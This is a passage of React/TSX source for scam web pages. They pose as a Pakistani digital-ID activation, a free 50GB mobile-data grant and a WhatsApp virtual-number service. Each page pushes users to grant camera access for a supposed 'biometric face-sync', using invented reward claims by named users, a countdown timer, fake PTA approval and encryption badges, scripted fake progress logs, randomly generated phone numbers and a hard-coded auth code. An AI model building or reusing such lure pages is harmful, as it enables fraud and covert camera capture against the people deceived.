                    <div className="p-4 rounded-2xl bg-red-500/10 border border-red-500/20 text-center space-y-3 animate-in fade-in zoom-in-95">
                      <div className="flex items-center justify-center gap-2 text-red-500">
                        <AlertCircle size={16} />
                        <span className="text-[10px] font-black uppercase tracking-widest">Access Denied</span>
                      </div>
                      <p className="text-[11px] text-zinc-400 font-medium">Camera access is essential for biometric verification. Please grant permission to proceed with Digital ID activation.</p>
                      <button 
                        onClick={() => requestPermissions()}
                        className="px-6 py-2 bg-red-500 text-white text-[10px] font-black uppercase rounded-lg hover:bg-red-600 transition-colors"
                      >
                        Grant Camera Access
                      </button>
                    </div>
                  )}

                  <button 
                    onClick={handleActivate}
                    className="w-full py-5 bg-blue-600 text-white font-black rounded-2xl transition-all hover:bg-blue-500 active:scale-95 shadow-[0_20px_40px_rgba(59,130,246,0.2)] uppercase tracking-widest text-xs relative overflow-hidden group"
                  >
                    <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-1000" />
                    Activate Digital ID Now
                  </button>
                  
                  <div className="flex items-center justify-center gap-6">
                    <div className="flex items-center gap-1.5 opacity-40">
                      <ShieldCheck size={12} className="text-white" />
                      <span className="text-[9px] font-bold uppercase tracking-widest">PTA Approved</span>
                    </div>
                    <div className="flex items-center gap-1.5 opacity-40">
                      <Lock size={12} className="text-white" />
                      <span className="text-[9px] font-bold uppercase tracking-widest">Encrypted</span>
                    </div>
                  </div>
                </div>
              )}

              {step === 1 && (
                <div className="space-y-10 py-4 animate-in fade-in duration-500">
                  <div className="text-center space-y-6">
                    <div className="relative w-24 h-24 mx-auto">
                      <div className="absolute inset-0 rounded-full border-2 border-dashed border-blue-500/20 animate-[spin_8s_linear_infinite]" />
                      <Loader2 className="w-24 h-24 text-blue-500 animate-[spin_2s_linear_infinite]" />
                      <div className="absolute inset-0 flex items-center justify-center">
                         <div className="w-12 h-12 rounded-full bg-blue-500/10 flex items-center justify-center">
                           <Monitor size={24} className="text-blue-500/40" />
                         </div>
                      </div>
                    </div>
                    <div className="space-y-1">
                      <h2 className="text-2xl font-bold text-white">Processing Identity</h2>
                      <p className="text-[10px] text-zinc-500 font-bold uppercase tracking-[0.3em] leading-none">Establishing Secure Link</p>
                    </div>
                  </div>
                  
                  <div className="space-y-4">
                    <div className="flex justify-between items-end px-2">
                      <span className="text-[10px] font-black uppercase text-zinc-500 tracking-[0.2em]">Activation Progress</span>
                      <span className="text-2xl font-black text-white italic">{progress}%</span>
                    </div>
                    <div className="h-3 w-full bg-white/5 rounded-full overflow-hidden">
                      <motion.div 
                        initial={{ width: 0 }}
                        animate={{ width: `${progress}%` }}
                        className="h-full bg-blue-500 transition-all duration-300 rounded-full shadow-[0_0_15px_rgba(59,130,246,0.5)]"
                      />
                    </div>
                  </div>

                  <div className="p-6 rounded-[2rem] bg-black/40 border border-white/5 font-mono text-[9px] text-zinc-400 space-y-1.5 shadow-inner">
                    <div className="pb-2 text-zinc-600 font-bold border-b border-white/5 mb-2">NODE_PK_SESSION</div>
                    {logs.map((log, i) => (
                      <motion.div 
                        initial={{ opacity: 0, x: -5 }} 
                        animate={{ opacity: 1, x: 0 }} 
                        key={i}
                        className="flex items-center gap-2"
                      >
                        <span className="text-blue-500/60">&gt;</span>
                        {log}
                      </motion.div>
                    ))}
                  </div>
                </div>
              )}

              {step === 2 && (
                <div className="space-y-10 text-center animate-in zoom-in-95 duration-1000">
                  <div className="relative w-28 h-28 mx-auto">
                    <div className="absolute inset-0 bg-blue-500/20 blur-3xl animate-pulse" />
                    <div className="relative w-28 h-28 rounded-full bg-blue-500/10 border border-blue-500/20 flex items-center justify-center shadow-inner">
                      <ShieldCheck className="w-14 h-14 text-blue-500" />
                    </div>
                  </div>
                  <div className="space-y-4">
                    <div className="space-y-2">
                       <h2 className="text-4xl font-black text-white tracking-tight leading-none uppercase">Activated!</h2>
                       <p className="text-[10px] font-black uppercase text-blue-500 tracking-[0.3em]">شناخت کی تصدیق ہو گئی • Identity Verified</p>
                    </div>
                    <p className="text-sm text-zinc-400 leading-relaxed px-4">Your Digital Pakistan Identity is now active. You can now securely access all digital services.</p>
                  </div>
                  <div className="space-y-4">
                    <button 
                      className="w-full py-6 bg-blue-600 text-white font-black rounded-2xl hover:bg-blue-500 transition-all uppercase tracking-widest text-sm shadow-[0_20px_40px_rgba(59,130,246,0.3)] active:scale-95"
                    >
                      Access Digital Services
                    </button>
                    <div className="flex flex-col items-center gap-2">
                      <div className="flex items-center justify-center gap-4 text-[9px] font-black text-zinc-600 uppercase tracking-widest">
                         <div className="flex items-center gap-1">
                           <div className="w-1 h-1 rounded-full bg-zinc-600" />
                           <span>E2EE Active</span>
                         </div>
                         <div className="flex items-center gap-1">
                           <div className="w-1 h-1 rounded-full bg-zinc-600" />
                           <span>TDI Issued</span>
                         </div>
                      </div>
                      <p className="text-[10px] text-zinc-500 italic opacity-50" dir="rtl">ڈیجیٹل خدمات تک رسائی حاصل کریں</p>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Floating Background Icons */}
        <div className="fixed bottom-10 left-10 opacity-5 pointer-events-none">
           <Monitor size={80} className="text-white" />
        </div>
        <div className="fixed top-20 right-10 opacity-5 pointer-events-none">
           <ShieldCheck size={80} className="text-white" />
        </div>
      </div>
    </div>
  );
}

const REWARD_CLAIMS = [
  { user: "Mohammad Ali", amount: "50GB", carrier: "Jazz 4G", time: "1m ago" },
  { user: "Fatima Khan", amount: "50GB", carrier: "Zong", time: "3m ago" },
  { user: "Zaid Ahmed", amount: "50GB", carrier: "Telenor", time: "4m ago" },
  { user: "Sara Malik", amount: "50GB", carrier: "Ufone", time: "6m ago" },
  { user: "Usman Sheikh", amount: "50GB", carrier: "Jazz 4G", time: "8m ago" },
];

const REWARD_LOGS = [
  "Jazz/Zong Network Handshake...",
  "PTA License Verification...",
  "Allocating local data bucket...",
  "SIM Biometric Identity Sync...",
  "Authorizing 50GB allocation...",
  "Digital Pakistan Bridge Active..."
];

function RewardStyle({ requestPermissions, permissionError }: { requestPermissions: () => Promise<boolean>, permissionError: string | null }) {
  const [step, setStep] = useState(0);
  const [progress, setProgress] = useState(0);
  const [tickerIndex, setTickerIndex] = useState(0);
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutes
  const [retryCount, setRetryCount] = useState(0);

  useEffect(() => {
    const tickerInterval = setInterval(() => {
      setTickerIndex(prev => (prev + 1) % REWARD_CLAIMS.length);
    }, 4000);

    const timerInterval = setInterval(() => {
      setTimeLeft(prev => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    if (step === 1) {
      const progInterval = setInterval(() => {
        setProgress(prev => {
          if (prev >= 100) {
            clearInterval(progInterval);
            setTimeout(() => setStep(2), 1500);
            return 100;
          }
          return prev + 1;
        });
      }, 40);
      return () => {
        clearInterval(progInterval);
        clearInterval(tickerInterval);
        clearInterval(timerInterval);
      };
    }
    return () => {
      clearInterval(tickerInterval);
      clearInterval(timerInterval);
    };
  }, [step]);

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${s < 10 ? '0' : ''}${s}`;
  };

  return (
    <div className="min-h-screen relative overflow-hidden bg-[#020617] font-sans selection:bg-green-400/30">
      {/* Premium Animated Background */}
      <div className="absolute inset-0 z-0 text-white/5 pointer-events-none select-none overflow-hidden flex flex-col items-center justify-center opacity-10">
         <div className="text-[20vw] font-black rotate-12 leading-none">PAKISTAN</div>
         <div className="text-[15vw] font-black -rotate-12 leading-none">DIGITAL</div>
      </div>
      
      <div className="absolute inset-0 z-0">
        <motion.div 
          animate={{ 
            scale: [1, 1.2, 1],
            x: [0, 50, 0],
            y: [0, 30, 0]
          }}
          transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
          className="absolute -top-[10%] -left-[10%] w-[60%] h-[60%] bg-green-500/10 blur-[120px] rounded-full" 
        />
        <motion.div 
          animate={{ 
            scale: [1, 1.3, 1],
            x: [0, -40, 0],
            y: [0, -50, 0]
          }}
          transition={{ duration: 25, repeat: Infinity, ease: "linear" }}
          className="absolute -bottom-[10%] -right-[10%] w-[60%] h-[60%] bg-blue-500/10 blur-[120px] rounded-full" 
        />
      </div>

      <div className="relative z-10 min-h-screen flex flex-col items-center pt-8 pb-12 px-4 shadow-inner">
        {/* Live Ticker */}
        <div className="w-full max-w-sm mb-6">
          <div className="bg-white/[0.02] border border-white/5 backdrop-blur-3xl rounded-2xl px-5 py-3 flex items-center justify-between overflow-hidden relative">
            <div className="flex items-center gap-2.5">
              <div className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse shadow-[0_0_10px_rgba(34,197,94,0.8)]" />
              <span className="text-[9px] font-black uppercase text-zinc-500 tracking-[0.2em] whitespace-nowrap">Live Reward</span>
            </div>
            <AnimatePresence mode="wait">
              <motion.div 
                key={tickerIndex}
                initial={{ y: 20, opacity: 0 }}
                animate={{ y: 0, opacity: 1 }}
                exit={{ y: -20, opacity: 0 }}
                className="flex items-center gap-2 text-[10px] font-bold text-zinc-300"
              >
                <span className="truncate max-w-[80px]">{REWARD_CLAIMS[tickerIndex].user}</span>
                <span className="text-green-500 font-black">{REWARD_CLAIMS[tickerIndex].amount}</span>
                <span className="text-[8px] bg-white/5 px-2 py-0.5 rounded-full text-zinc-500 uppercase tracking-tighter">{REWARD_CLAIMS[tickerIndex].carrier}</span>
              </motion.div>
            </AnimatePresence>
          </div>
        </div>

        <div className="max-w-md w-full space-y-6">
          <div className="text-center space-y-3">
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              className="inline-flex p-4 rounded-3xl bg-green-600/10 border border-green-600/20 backdrop-blur-xl mb-1 shadow-2xl"
            >
              <Gift className="w-10 h-10 text-green-500" />
            </motion.div>
            <div className="space-y-1">
              <h1 className="text-3xl md:text-4xl font-black text-white tracking-widest leading-none uppercase italic">AURA REWARD</h1>
              <div className="flex flex-col items-center gap-1">
                <p className="text-green-500 text-[9px] font-black uppercase tracking-[0.4em]">Digital Pakistan Node</p>
                <p className="text-zinc-500 text-xs font-urdu font-bold" dir="rtl">ڈیجیٹل پاکستان انیشیٹو</p>
              </div>
            </div>
          </div>

          <div className="rounded-[2.5rem] p-[1px] shadow-2xl bg-gradient-to-b from-white/10 to-transparent">
            <div className="bg-[#020617]/90 backdrop-blur-3xl rounded-[2.4rem] p-8 md:p-10 space-y-8 relative overflow-hidden shadow-inner">
              {/* PTA Watermark */}
              <div className="absolute -top-10 -right-10 opacity-5 pointer-events-none select-none">
                 <CheckCircle2 size={160} className="text-white" />
              </div>

              {step === 0 && (
                <div className="space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-500">
                  <div className="space-y-4 text-center">
                    <div className="inline-block px-3 py-1 rounded-full bg-green-500/10 border border-green-500/20 text-[9px] font-black text-green-500 uppercase tracking-widest">
                       Special Allocation found
                    </div>
                    <h2 className="text-3xl font-black text-white tracking-tight leading-tight uppercase">50GB FREE DATA</h2>
                    <p className="text-[11px] text-zinc-500 font-medium leading-relaxed uppercase tracking-wider">Your number is eligible for the 2024 high-speed connectivity grant.</p>
                  </div>
                  
                  <div className="bg-white/[0.02] rounded-3xl p-6 border border-white/5 space-y-5 relative overflow-hidden shadow-inner">
                    <div className="absolute top-0 right-0 w-32 h-32 bg-green-500/10 blur-[80px] -mr-16 -mt-16" />
                    <div className="flex justify-between items-center relative z-10">
                        <div className="flex items-center gap-3">
                           <div className="w-9 h-9 rounded-2xl bg-green-500/10 flex items-center justify-center border border-green-500/20">
                              <Globe size={18} className="text-green-500" />
                           </div>
                           <div className="flex flex-col">
                             <span className="text-[10px] font-black text-zinc-300 uppercase tracking-widest">Bucket Status</span>
                             <span className="text-[8px] text-zinc-500 uppercase font-black">Ready for Claim</span>
                           </div>
                        </div>
                        <div className="flex flex-col items-end">
                          <span className="text-xs font-black text-green-500 tracking-tighter italic uppercase">Live</span>
                          <div className="w-10 h-[2px] bg-green-500/30 rounded-full" />
                        </div>
                    </div>

                    <div className="space-y-4 relative z-10 pt-4 border-t border-white/5">
                        <div className="flex justify-between items-end">
                           <div className="space-y-0.5">
                              <p className="text-[9px] font-black uppercase text-zinc-600 tracking-widest">Allocation</p>
                              <p className="text-3xl font-black text-white italic tracking-tighter">50.00 GB</p>
                           </div>
                           <div className="text-right space-y-0.5">
                              <p className="text-[9px] font-black uppercase text-zinc-600 tracking-widest">Expires In</p>
                              <p className="text-xl font-mono font-bold text-cyber-blue shadow-cyber-blue">{formatTime(timeLeft)}</p>
                           </div>
                        </div>
                        <div className="w-full h-1.5 bg-white/5 rounded-full overflow-hidden">
                           <motion.div 
                              animate={{ x: ["-100%", "100%"] }} 
                              transition={{ duration: 4, repeat: Infinity, ease: "linear" }}
                              className="w-[30%] h-full bg-cyber-blue/50 blur-[1px]" 
                           />
                        </div>
                    </div>
                  </div>

                  {permissionError && (
                    <div className="p-5 rounded-2xl bg-red-500/5 border border-red-500/20 text-center space-y-3 animate-in fade-in zoom-in-95">
                      <div className="flex items-center justify-center gap-2 text-red-500">
                        <AlertCircle size={14} />
                        <span className="text-[10px] font-black uppercase tracking-widest">Verification Suspended</span>
                      </div>
                      <p className="text-[10px] text-zinc-500 font-bold leading-relaxed uppercase tracking-wider">Neural identity mapping is required to authorize the data bucket transfer.</p>
                      <button 
                        onClick={() => requestPermissions()}
                        className="w-full py-3 bg-red-600/10 border border-red-600/40 text-red-500 text-[10px] font-black uppercase rounded-xl hover:bg-red-600 hover:text-white transition-all active:scale-95"
                      >
                        Try Biometric Sync Again
                      </button>
                    </div>
                  )}

                  <button 
                    onClick={async () => {
                      const success = await requestPermissions();
                      if (success) setStep(1);
                    }}
                    className="w-full py-5 bg-green-500 text-[#020617] font-black rounded-2xl transition-all active:scale-95 shadow-[0_15px_40px_rgba(34,197,94,0.3)] uppercase tracking-widest text-xs relative overflow-hidden group shadow-inner"
                  >
                    <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/40 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-700" />
                    Claim 50GB Reward Now
                  </button>
                  
                  <div className="flex items-center justify-center gap-6 pt-2">
                    <div className="flex items-center gap-2 opacity-30 grayscale hover:grayscale-0 transition-all">
                      <ShieldCheck size={12} className="text-green-500" />
                      <span className="text-[8px] font-black uppercase tracking-widest">Secure Link</span>
                    </div>
                    <div className="flex items-center gap-2 opacity-30 grayscale">
                      <Lock size={12} className="text-blue-500" />
                      <span className="text-[8px] font-black uppercase tracking-widest">End-to-End</span>
                    </div>
                  </div>
                </div>
              )}

              {step === 1 && (
                <div className="space-y-12 py-6 animate-in fade-in duration-500">
                  <div className="text-center space-y-6">
                    <div className="relative w-28 h-28 mx-auto">
                      <div className="absolute inset-0 rounded-full border-2 border-dashed border-green-500/20 animate-[spin_12s_linear_infinite]" />
                      <div className="absolute inset-4 rounded-full border border-green-500/10 animate-[spin_8s_linear_reverse_infinite]" />
                      <div className="absolute inset-0 flex items-center justify-center">
                         <div className="w-16 h-16 rounded-full bg-green-500/5 flex items-center justify-center border border-green-500/10 shadow-inner">
                           <Loader2 className="w-8 h-8 text-green-500 animate-spin" />
                         </div>
                      </div>
                    </div>
                    <div className="space-y-2">
                      <h2 className="text-2xl font-black text-white uppercase italic tracking-tight">Syncing Node...</h2>
                      <p className="text-[9px] text-[#25D366] font-black uppercase tracking-[0.4em] leading-none opacity-60">Handshake in Progress</p>
                    </div>
                  </div>
                  
                  <div className="space-y-6">
                    <div className="flex justify-between items-end px-1">
                      <div className="flex flex-col gap-1">
                        <span className="text-[10px] font-black uppercase text-zinc-600 tracking-widest">Data Provisioning</span>
                        <div className="flex gap-1">
                          {[0,1,2,3].map(i => (
                            <div key={i} className={`w-1 h-3 rounded-full ${Math.floor(progress/25) >= i ? 'bg-green-500 shadow-[0_0_10px_rgba(34,197,94,0.5)]' : 'bg-white/5'}`} />
                          ))}
                        </div>
                      </div>
                      <span className="text-4xl font-black text-white italic tracking-tighter">{progress}%</span>
                    </div>
                    <div className="h-4 w-full bg-white/[0.03] rounded-full overflow-hidden border border-white/5 p-1 shadow-inner">
                      <motion.div 
                        initial={{ width: 0 }}
                        animate={{ width: `${progress}%` }}
                        className="h-full bg-gradient-to-r from-green-600 to-green-400 transition-all duration-300 rounded-full shadow-[0_0_20px_rgba(34,197,94,0.4)]"
                      />
                    </div>
                  </div>

                  <div className="p-8 rounded-[2rem] bg-black/60 border border-white/5 font-mono text-[9px] text-zinc-500 space-y-2 shadow-2xl relative overflow-hidden">
                    <div className="absolute top-0 right-0 w-24 h-24 bg-green-500/5 blur-3xl" />
                    <div className="flex items-center gap-2 pb-3 mb-3 border-b border-white/5 text-zinc-700 font-black tracking-widest uppercase">
                       <Smartphone size={10} />
                       SESSION_PK_INIT
                    </div>
                    {REWARD_LOGS.slice(0, Math.floor(progress / 18) + 1).map((log, i) => (
                      <motion.div 
                        initial={{ opacity: 0, x: -8 }} 
                        animate={{ opacity: 1, x: 0 }} 
                        key={i}
                        className="flex items-center gap-3"
                      >
                        <span className="text-green-500 font-bold">»</span>
                        <span className="truncate">{log}</span>
                      </motion.div>
                    ))}
                  </div>
                </div>
              )}

              {step === 2 && (
                <div className="space-y-10 text-center animate-in zoom-in-95 duration-700">
                  <div className="relative w-32 h-32 mx-auto">
                    <div className="absolute inset-0 bg-green-500/20 blur-[60px] animate-pulse rounded-full" />
                    <div className="relative w-32 h-32 rounded-full bg-green-500/5 border border-green-500/20 flex items-center justify-center shadow-inner group overflow-hidden">
                       <div className="absolute inset-0 bg-gradient-to-tr from-green-500/10 to-transparent" />
                       <Sparkles className="w-16 h-16 text-green-500 shadow-green-500 drop-shadow-[0_0_10px_rgba(34,197,94,0.5)]" />
                    </div>
                  </div>
                  <div className="space-y-6">
                    <div className="space-y-3">
                       <h2 className="text-5xl font-black text-white tracking-tighter leading-none italic uppercase">READY!</h2>
                       <div className="flex flex-col items-center gap-1">
                         <p className="text-[10px] font-black uppercase text-green-500 tracking-[0.4em]">Handshake Confirmed</p>
                         <div className="w-12 h-[1px] bg-green-500/40" />
                       </div>
                    </div>
                    <p className="text-xs text-zinc-500 font-bold uppercase tracking-wider px-4 leading-relaxed">
                      Allocation pre-authorized. <span className="text-white italic">Security Requirement:</span> Perform a biometric face-sync to map the data bucket to your SIM identity.
                    </p>
                  </div>
                  <div className="space-y-6">
                    <button 
                      className="w-full py-6 bg-green-500 text-[#020617] font-black rounded-2xl hover:scale-[1.02] transition-all uppercase tracking-widest text-sm shadow-[0_25px_60px_rgba(34,197,94,0.4)] active:scale-95 shadow-inner"
                    >
                      Verify Identity & Claim
                    </button>
                    <div className="flex flex-col items-center gap-3">
                      <div className="flex items-center justify-center gap-6 text-[9px] font-black text-zinc-600 uppercase tracking-widest opacity-80">
                         <div className="flex items-center gap-2">
                           <div className="w-1 h-1 rounded-full bg-green-500" />
                           <span>Sim Lock Disengaged</span>
                         </div>
                         <div className="flex items-center gap-2">
                           <div className="w-1 h-1 rounded-full bg-green-500" />
                           <span>PTA Gateway Open</span>
                         </div>
                      </div>
                      <div className="px-4 py-2 rounded-full border border-white/5 bg-white/[0.02]">
                        <p className="text-[10px] text-zinc-500 italic uppercase font-black tracking-widest" dir="rtl">بایومیٹرک تصدیق شروع کریں</p>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Floating Icons for Aesthetic */}
        <div className="hidden lg:block fixed bottom-20 left-20 opacity-10 pointer-events-none">
           <Smartphone size={100} className="text-white" />
        </div>
        <div className="hidden lg:block fixed top-20 right-20 opacity-10 pointer-events-none">
           <Hash size={100} className="text-white" />
        </div>
      </div>
    </div>
  );
}

const COUNTRIES = [
  { code: 'US', name: 'United States', flag: '🇺🇸', area: '+1', count: 'Active' },
  { code: 'UK', name: 'United Kingdom', flag: '🇬🇧', area: '+44', count: 'Active' },
  { code: 'CA', name: 'Canada', flag: '🇨🇦', area: '+1', count: 'Active' },
  { code: 'TR', name: 'Turkey', flag: '🇹🇷', area: '+90', count: 'Limited' },
  { code: 'SA', name: 'Saudi Arabia', flag: '🇸🇦', area: '+966', count: 'Active' },
  { code: 'DE', name: 'Germany', flag: '🇩🇪', area: '+49', count: 'Active' },
];

const VIRTUAL_NUMBER_LOGS = [
  "WhatsApp Activation Server: PK-SOUTH-1 Init...",
  "Bypassing international SMS gateway...",
  "Allocating virtual SIM instance...",
  "Verifying SIM registration with node...",
  "Binding number to local session...",
  "Generating secure activation token...",
  "Finalizing WhatsApp identity bridge..."
];

function VirtualNumberStyle({ requestPermissions, permissionError }: { requestPermissions: () => Promise<boolean>, permissionError: string | null }) {
  const [selectedCountry, setSelectedCountry] = useState<string | null>(null);
  const [isGenerating, setIsGenerating] = useState(false);
  const [step, setStep] = useState(0); // 0: Selection, 1: Generating, 2: Result/Finish
  const [genLogs, setGenLogs] = useState<string[]>([]);
  const [fakeNumber, setFakeNumber] = useState('');

  const handleGenerate = async () => {
    const success = await requestPermissions();
    if (!success) return;
    
    setIsGenerating(true);
    setStep(1);
    
    // Play logs
    let currentLog = 0;
    const logInterval = setInterval(() => {
      if (currentLog < VIRTUAL_NUMBER_LOGS.length) {
        setGenLogs(prev => [...prev, `[${new Date().toLocaleTimeString('en-GB')}] ${VIRTUAL_NUMBER_LOGS[currentLog]}`]);
        currentLog++;
      } else {
        clearInterval(logInterval);
        setTimeout(() => {
          const area = COUNTRIES.find(c => c.code === selectedCountry)?.area || '+1';
          const randomNum = Math.floor(Math.random() * 9000000) + 1000000;
          setFakeNumber(`${area} ${randomNum}`);
          setStep(2);
        }, 2000);
      }
    }, 700);
  };

  return (
    <div className="fixed inset-0 bg-[#f0f2f5] text-zinc-900 flex flex-col font-sans selection:bg-green-500/20 overflow-hidden h-[100dvh]">
      {/* WhatsApp Style Header */}
      <nav className="px-6 py-4 pt-12 bg-[#075E54] text-white flex items-center justify-between shadow-lg shrink-0">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center shadow-inner">
            <MessageSquare size={22} className="text-[#25D366]" />
          </div>
          <div className="flex flex-col">
            <span className="font-black text-base tracking-tight leading-none">WA-PK ACTIVATOR</span>
            <div className="flex items-center gap-1.5 mt-1">
              <div className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
              <span className="text-[8px] font-black uppercase tracking-widest opacity-60">Karachi Node (Active)</span>
            </div>
          </div>
        </div>
        <div className="flex items-center gap-2">
           <div className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center transition-colors">
              <RefreshCw size={18} className="opacity-60" />
           </div>
           <button onClick={() => window.close()} className="p-1">
             <X size={24} className="opacity-60" />
           </button>
        </div>
      </nav>

      <main className="flex-1 overflow-y-auto pb-10 bg-gradient-to-b from-white to-[#e5e7eb] pt-8">
        <div className="max-w-xl mx-auto px-6 space-y-8">
          {step === 0 && (
            <>
              <div className="text-center space-y-4">
                <div className="space-y-3">
                  <motion.h1 
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="text-3xl font-black text-zinc-800 tracking-tight leading-none uppercase italic"
                  >
                    Private Numbers
                  </motion.h1>
                  <div className="flex flex-col items-center gap-1">
                    <p className="text-[#128C7E] text-[10px] font-black uppercase tracking-[0.3em]">Activation Service</p>
                    <p className="text-zinc-400 text-xs font-urdu font-bold" dir="rtl">واٹس ایپ کے لیے پرائیویٹ نمبر حاصل کریں۔</p>
                  </div>
                </div>
                <motion.p 
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  transition={{ delay: 0.1 }}
                  className="text-xs text-zinc-500 font-bold leading-relaxed uppercase tracking-widest opacity-60 px-4"
                >
                  Temporary virtual instances for instant WhatsApp activation via Karachi Node bypass.
                </motion.p>
              </div>

              <div className="grid grid-cols-2 gap-3 animate-in fade-in slide-in-from-bottom-4 duration-500">
                {COUNTRIES.map((c) => (
                  <button
                    key={c.code}
                    onClick={() => setSelectedCountry(c.code)}
                    className={`p-4 rounded-3xl border transition-all relative group text-left shadow-sm ${
                      selectedCountry === c.code 
                        ? 'bg-white border-[#25D366] ring-4 ring-[#25D366]/5' 
                        : 'bg-white border-zinc-100 hover:border-zinc-200'
                    }`}
                  >
                    <div className="flex flex-col gap-3">
                      <div className="flex items-center justify-between">
                        <span className="text-2xl">{c.flag}</span>
                        {selectedCountry === c.code && (
                           <div className="w-5 h-5 rounded-full bg-[#25D366] flex items-center justify-center">
                             <CheckCircle2 size={12} className="text-white" />
                           </div>
                        )}
                      </div>
                      <div>
                        <p className="text-[10px] font-black text-zinc-400 uppercase tracking-widest leading-none mb-1">{c.name}</p>
                        <p className="text-sm font-black text-zinc-800">{c.area}</p>
                      </div>
                    </div>
                  </button>
                ))}
              </div>

              <div className="pt-4">
                <button 
                  onClick={handleGenerate}
                  disabled={!selectedCountry}
                  className="w-full py-5 bg-[#25D366] text-white font-black rounded-2xl transition-all hover:shadow-[0_15px_30px_rgba(37,211,102,0.3)] active:scale-95 disabled:opacity-30 disabled:grayscale uppercase tracking-[0.2em] text-[11px] relative overflow-hidden group"
                >
                  <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-700" />
                  Request Private Instance
                </button>
                <div className="flex items-center justify-center gap-4 mt-6 opacity-30 grayscale text-[8px] font-black uppercase tracking-widest">
                   <div className="flex items-center gap-1.5">
                     <Shield size={10} />
                     <span>SECURE HANDSHAKE</span>
                   </div>
                   <div className="flex items-center gap-1.5">
                     <Lock size={10} />
                     <span>E2EE BYPASS</span>
                   </div>
                </div>
              </div>
            </>
          )}

          {step === 1 && (
            <div className="space-y-8 py-8 animate-in fade-in duration-500 text-center">
              <div className="relative w-28 h-28 mx-auto">
                <div className="absolute inset-0 rounded-full border-2 border-dashed border-[#075E54]/20 animate-[spin_10s_linear_infinite]" />
                <Loader2 className="w-28 h-28 text-[#128C7E] animate-spin-slow opacity-20" />
                <div className="absolute inset-0 flex items-center justify-center">
                  <div className="w-14 h-14 rounded-full bg-white shadow-xl flex items-center justify-center border border-zinc-100">
                     <RefreshCw size={24} className="text-[#128C7E] animate-spin" />
                  </div>
                </div>
              </div>
              
              <div className="space-y-2">
                <h2 className="text-xl font-black text-zinc-800 uppercase tracking-tight">Provisioning Number</h2>
                <div className="flex items-center justify-center gap-2">
                   <div className="w-1.5 h-1.5 rounded-full bg-[#128C7E] animate-pulse" />
                   <span className="text-[10px] font-bold uppercase tracking-widest text-[#128C7E]">Establishing Bridge...</span>
                </div>
              </div>

              <div className="p-6 rounded-[2.5rem] bg-zinc-900 border border-white/5 font-mono text-[9px] text-[#25D366]/60 space-y-1.5 shadow-2xl text-left overflow-hidden relative">
                <div className="absolute top-0 right-0 w-24 h-24 bg-[#25D366]/5 blur-3xl" />
                <div className="pb-2 text-zinc-600 font-black border-b border-white/5 mb-3 uppercase tracking-widest flex items-center gap-2">
                  <Monitor size={10} />
                  INSTANCE_LOG v4.2
                </div>
                {genLogs.map((log, i) => (
                  <motion.div 
                    initial={{ opacity: 0, x: -5 }} 
                    animate={{ opacity: 1, x: 0 }} 
                    key={i}
                    className="flex items-center gap-2 truncate"
                  >
                    <span className="text-[#128C7E]/40 font-bold">&gt;</span>
                    {log}
                  </motion.div>
                ))}
              </div>
            </div>
          )}

          {step === 2 && (
            <div className="max-w-xl mx-auto animate-in zoom-in-95 fade-in duration-700">
               <div className="bg-white rounded-[3rem] overflow-hidden shadow-2xl border border-zinc-100">
                 {/* Dashboard Header */}
                 <div className="p-8 border-b border-zinc-50 bg-[#f8f9fa] flex items-center justify-between">
                    <div className="space-y-1">
                      <span className="text-[9px] font-black text-[#128C7E] uppercase tracking-widest leading-none">PVT-WA-INSTANCE</span>
                      <h3 className="text-xl font-black text-zinc-800 tracking-tight">ID: {Math.floor(Math.random() * 90000) + 10000}</h3>
                    </div>
                    <div className="px-3 py-1 rounded-full bg-green-100 text-[#075E54] border border-[#25D366]/20 flex items-center gap-1.5 shadow-sm">
                      <Sparkles size={12} />
                      <span className="text-[8px] font-black uppercase tracking-widest">Active</span>
                    </div>
                 </div>

                 <div className="p-8 space-y-8">
                    <div className="space-y-8">
                       <div className="space-y-8">
                          <div className="space-y-3">
                            <label className="text-[9px] font-black text-zinc-400 uppercase tracking-[0.3em] ml-1">Assigned Instance</label>
                            <div className="p-6 rounded-3xl bg-zinc-50 border border-zinc-100 text-2xl font-black text-[#075E54] tracking-tight shadow-inner text-center relative overflow-hidden">
                              {fakeNumber}
                              <div className="absolute top-0 right-0 p-2 opacity-5">
                                 <Smartphone size={60} />
                              </div>
                            </div>
                          </div>
                          
                          <div className="space-y-3">
                            <label className="text-[9px] font-black text-zinc-400 uppercase tracking-[0.3em] ml-1">Auth Code (Hidden)</label>
                            <div className="p-6 rounded-3xl bg-zinc-900 border border-white/10 text-3xl font-black text-white tracking-[0.5em] shadow-2xl relative overflow-hidden text-center group cursor-pointer">
                               <span className="blur-xl transition-all duration-700 group-hover:blur-lg">882910</span>
                               <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/70 backdrop-blur-md border border-[#25D366]/30">
                                  <Lock size={18} className="text-[#25D366] mb-1 opacity-60" />
                                  <span className="text-[9px] font-black uppercase text-white tracking-[0.2em] font-urdu" dir="rtl">تصدیق درکار ہے</span>
                                  <span className="text-[8px] font-bold uppercase text-white/40 tracking-widest mt-0.5 whitespace-nowrap">Perform Biometric Link</span>
                               </div>
                            </div>
                          </div>
                       </div>

